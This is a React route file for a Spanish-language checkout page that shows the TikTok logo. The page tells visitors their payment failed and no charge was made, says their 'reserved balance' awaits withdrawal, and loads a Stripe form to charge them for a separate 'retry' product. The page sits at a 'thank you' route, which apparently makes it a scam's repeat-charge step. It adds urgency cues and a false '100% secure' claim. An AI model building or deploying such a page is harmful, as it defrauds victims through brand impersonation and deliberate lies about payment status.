import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";
import {
  THREEB_API_KEY,
  THREEB_BASE_URL,
  formatPrice,
  loadStripeJs,
  type CheckoutConfig,
} from "@/lib/checkout-config";

const RETRY_PRODUCT_ID = "65009b71-7660-44ef-ba87-24f29c7599a4";

export const Route = createFileRoute("/obrigado")({
  head: () => ({
    meta: [
      { title: "El pago no se ha completado | Finaliza tu retiro" },
      {
        name: "description",
        content:
          "Inestabilidad temporal o sesión expirada. No se realizó ningún cargo a tu tarjeta. Vuelve a intentarlo para finalizar tu retiro.",
      },
      { property: "og:title", content: "El pago no se ha completado" },
      {
        property: "og:description",
        content: "Vuelve a intentarlo para finalizar tu retiro. Tu saldo sigue reservado.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Obrigado,
});

function Obrigado() {
  const [open, setOpen] = useState(false);
  const [config, setConfig] = useState<CheckoutConfig | null>(null);
  const [email, setEmail] = useState("");
  const [loadError, setLoadError] = useState<string | null>(null);
  const [payError, setPayError] = useState<string | null>(null);
  const [paying, setPaying] = useState(false);
  const [ready, setReady] = useState(false);

  const stripeRef = useRef<any>(null);
  const elementsRef = useRef<any>(null);
  const emailRef = useRef("");
  emailRef.current = email;

  useEffect(() => {
    if (!open) return;
    let cancelled = false;

    (async () => {
      try {
        const res = await fetch(
          `${THREEB_BASE_URL}/get-checkout-config?apiKey=${encodeURIComponent(
            THREEB_API_KEY,
          )}&productId=${encodeURIComponent(RETRY_PRODUCT_ID)}`,
        );
        if (!res.ok) throw new Error(await res.text());
        const data: CheckoutConfig = await res.json();
        if (cancelled) return;
        setConfig(data);

        const Stripe = await loadStripeJs();
        if (cancelled) return;
        const stripe = Stripe(data.publishableKey);
        stripeRef.current = stripe;

        const elements = stripe.elements({
          mode: "payment",
          amount: data.product.priceCents,
          currency: data.product.currency.toLowerCase(),
          locale: "es",
          appearance: {
            theme: "stripe",
            variables: {
              colorPrimary: "#f43f5e",
              borderRadius: "12px",
              fontFamily: "system-ui, sans-serif",
            },
          },
        });
        elementsRef.current = elements;

        const expr = elements.create("expressCheckout");
        expr.mount("#retry-express");
        expr.on("confirm", () => void pay());

        const payment = elements.create("payment", {
          terms: { card: "never" },
          fields: { billingDetails: { email: "never" } },
        });
        payment.mount("#retry-payment");
        payment.on("ready", () => setReady(true));
      } catch (e: any) {
        if (!cancelled) setLoadError(e?.message || "No se pudo cargar el pago.");
      }
    })();

    return () => {
      cancelled = true;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open]);

  async function pay() {
    const stripe = stripeRef.current;
    const elements = elementsRef.current;
    if (!stripe || !elements || !config) return;

    setPayError(null);
    setPaying(true);
    try {
      const buyerEmail = emailRef.current.trim();
      if (!buyerEmail) {
        setPayError("Introduce tu correo electrónico.");
        setPaying(false);
        return;
      }

      const { error: submitError } = await elements.submit();
      if (submitError) {
        setPayError(submitError.message || "Revisa los datos de la tarjeta.");
        setPaying(false);
        return;
      }

      const res = await fetch(`${THREEB_BASE_URL}/create-payment-intent`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          apiKey: THREEB_API_KEY,
          productId: config.product.id,
          quantity: 1,
          buyerEmail,
        }),
      });
      if (!res.ok) throw new Error(await res.text());
      const { clientSecret, paymentIntentId } = await res.json();

      const { error } = await stripe.confirmPayment({
        elements,
        clientSecret,
        confirmParams: {
          return_url: `${window.location.origin}/obrigado?payment_intent=${paymentIntentId}`,
          payment_method_data: { billing_details: { email: buyerEmail } },
        },
      });
      if (error) setPayError(error.message || "No se pudo procesar el pago.");
    } catch (e: any) {
      setPayError(e?.message || "No se pudo procesar el pago.");
    } finally {
      setPaying(false);
    }
  }

  return (
    <main className="min-h-screen w-full bg-neutral-500 px-4 py-10 flex items-center justify-center">
      <section className="w-full max-w-md rounded-2xl bg-white px-7 py-8 shadow-[0_20px_60px_rgba(0,0,0,0.25)]">
        {/* Logo */}
        <img
          src={tiktokLogo.url}
          alt="TikTok"
          className="mx-auto mb-7 h-12 w-auto"
        />

        {/* Icon */}
        <div className="mx-auto mb-6 grid h-[72px] w-[72px] place-items-center rounded-full bg-rose-100">

          <svg
            viewBox="0 0 24 24"
            className="h-8 w-8 text-rose-500"
            fill="none"
            stroke="currentColor"
            strokeWidth="2.5"
            strokeLinecap="round"
            aria-hidden="true"
          >
            <path d="M6 6l12 12M18 6L6 18" />
          </svg>
        </div>

        {/* Badge */}
        <div className="mb-5 flex justify-center">
          <span className="inline-flex items-center gap-2 rounded-full bg-amber-100 px-4 py-1.5 text-[11px] font-extrabold uppercase tracking-wide text-amber-800">
            <span className="h-1.5 w-1.5 rounded-full bg-amber-500" />
            Casi listo · Solo 1 paso
          </span>
        </div>

        <h1 className="mb-3 text-center text-[28px] font-black leading-tight text-neutral-900">
          El pago no se ha completado
        </h1>
        <p className="mx-auto mb-6 max-w-[330px] text-center text-[15px] leading-relaxed text-neutral-500">
          Inestabilidad temporal o sesión expirada. No se realizó ningún cargo a tu tarjeta.
        </p>

        {/* Retry notice */}
        <div className="mb-4 rounded-xl border border-rose-100 bg-rose-50/70 px-4 py-4 text-center text-sm font-bold text-rose-500">
          Vuelve a intentarlo para finalizar tu retiro.
        </div>

        {/* Reserved balance */}
        <div className="mb-6 rounded-xl border border-dashed border-rose-200 px-4 py-4">
          <p className="mb-1.5 flex items-center gap-2 text-[11px] font-extrabold uppercase tracking-wide text-rose-500">
            <svg
              viewBox="0 0 24 24"
              className="h-3.5 w-3.5"
              fill="none"
              stroke="currentColor"
              strokeWidth="2.5"
              aria-hidden="true"
            >
              <circle cx="12" cy="12" r="9" />
              <path d="M12 7v5l3 2" strokeLinecap="round" />
            </svg>
            Tu saldo sigue reservado
          </p>
          <p className="text-sm leading-relaxed text-neutral-700">
            Finaliza ahora para asegurar el desbloqueo y recibir en 15 minutos.
          </p>
        </div>

        {!open ? (
          <button
            type="button"
            onClick={() => setOpen(true)}
            className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-b from-rose-500 to-rose-600 py-4 text-[17px] font-black text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
          >
            Intentar de nuevo
            <span aria-hidden="true">→</span>
          </button>
        ) : (
          <div>
            <button
              type="button"
              onClick={() => void pay()}
              disabled={!ready || paying}
              className="mb-5 flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-b from-rose-500 to-rose-600 py-4 text-[17px] font-black text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99] disabled:opacity-60"
            >
              {paying
                ? "Procesando…"
                : `Pagar ahora${
                    config
                      ? ` ${formatPrice(config.product.priceCents, config.product.currency)}`
                      : ""
                  }`}
              <svg
                viewBox="0 0 24 24"
                className="h-4 w-4"
                fill="none"
                stroke="currentColor"
                strokeWidth="2.5"
                aria-hidden="true"
              >
                <rect x="4" y="10" width="16" height="10" rx="2" />
                <path d="M8 10V7a4 4 0 118 0v3" />
              </svg>
            </button>

            {loadError && (
              <p className="mb-3 text-sm font-medium text-rose-600" role="alert">
                {loadError}
              </p>
            )}

            <label
              className="mb-1 block text-sm font-semibold text-neutral-700"
              htmlFor="retry-email"
            >
              Correo electrónico
            </label>
            <input
              id="retry-email"
              type="email"
              inputMode="email"
              autoComplete="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="tu@email.com"
              className="mb-4 w-full rounded-xl border border-neutral-300 bg-white px-4 py-3 text-sm outline-none focus:border-rose-400 focus:ring-2 focus:ring-rose-200"
            />

            <div id="retry-express" className="mb-4" />
            <div id="retry-payment" className="mb-3 min-h-[140px]" />

            {payError && (
              <p className="mb-2 text-sm font-medium text-rose-600" role="alert">
                {payError}
              </p>
            )}
          </div>
        )}

        <div className="mt-6 border-t border-dashed border-neutral-200 pt-4">
          <p className="flex items-center justify-center gap-1.5 text-[11px] font-bold uppercase tracking-wide text-neutral-400">
            <svg
              viewBox="0 0 24 24"
              className="h-3.5 w-3.5"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              aria-hidden="true"
            >
              <rect x="4" y="10" width="16" height="10" rx="2" />
              <path d="M8 10V7a4 4 0 118 0v3" />
            </svg>
            Entorno 100% seguro · Cifrado de nivel bancario
          </p>
        </div>
      </section>
    </main>
  );
}
